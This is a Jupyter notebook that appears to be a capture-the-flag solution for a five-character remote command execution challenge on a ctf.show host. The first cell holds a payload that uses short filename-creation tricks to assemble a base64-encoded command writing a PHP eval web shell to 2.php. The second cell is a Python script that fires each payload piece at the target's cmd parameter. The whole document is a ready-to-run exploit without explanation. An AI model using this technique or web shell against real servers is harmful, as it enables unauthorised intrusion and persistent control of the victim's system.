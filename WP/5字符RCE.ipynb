{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "pl ='''>dir\n",
    ">f\\>\n",
    ">ht-\n",
    ">sl\n",
    "*>v\n",
    ">rev\n",
    "*v>0\n",
    ">a\n",
    ">hp\n",
    ">p\\\\\n",
    ">2.\\\\\n",
    ">\\>\\\\\n",
    ">-d\\\\\n",
    ">\\%09\\\\\n",
    ">64\\\\\n",
    ">se\\\\\n",
    ">ba\\\\\n",
    ">\\|\\\\\n",
    ">7\\\\\n",
    ">Sk\\\\\n",
    ">X\\\\\n",
    ">x\\\\\n",
    ">Fs\\\\\n",
    ">FV\\\\\n",
    ">d\\\\\n",
    ">X0\\\\\n",
    ">k\\\\\n",
    ">g\\\\\n",
    ">bC\\\\\n",
    ">h\\\\\n",
    ">XZ\\\\\n",
    ">gZ\\\\\n",
    ">A\\\\\n",
    ">aH\\\\\n",
    ">w\\\\\n",
    ">D9\\\\\n",
    ">P\\\\\n",
    ">\\ \\\\\n",
    ">o\\\\\n",
    ">ch\\\\\n",
    ">e\\\\\n",
    "sh 0\n",
    "sh f'''.splitlines()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import urllib.parse\n",
    "url = \"http://35ca0584-b4b6-40d9-ac96-f679e4641ac5.challenge.ctf.show/index.php?cmd={0}\"\n",
    "print(\"[+]start attack!!!\")\n",
    "for i in pl:\n",
    "    print(\"[*]\" + url.format(i.strip()))\n",
    "    requests.get(url.format(urllib.parse.unquote(i.strip())))"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
